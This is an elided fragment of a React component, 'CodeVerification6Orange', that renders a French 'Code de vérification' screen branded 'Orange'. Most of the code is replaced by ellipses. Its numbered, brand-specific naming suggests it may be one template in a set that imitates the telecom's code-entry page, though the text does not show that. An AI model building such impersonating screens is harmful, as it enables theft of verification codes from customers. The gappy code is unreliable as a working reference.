...
export default function CodeVerification6Orange({ data, onSubmit, loading, onExpire }) {
  ...
  return (
    <motion.div
      ...
      <div className="bg-card border border-border rounded-3xl px-6 py-10 shadow-2xl shadow-black/60 text-center">
        ...
        <h2 className="font-heading text-xl font-bold text-foreground mb-2">Code de vérification</h2>
        ...
        <div className="bg-secondary/30 border border-border rounded-xl px-4 py-3 mb-6 text-center">
          ...
          <div className="flex items-center justify-center gap-2 mb-1">
            ...
            <span className="text-foreground font-bold text-base">Orange</span>
          </div>
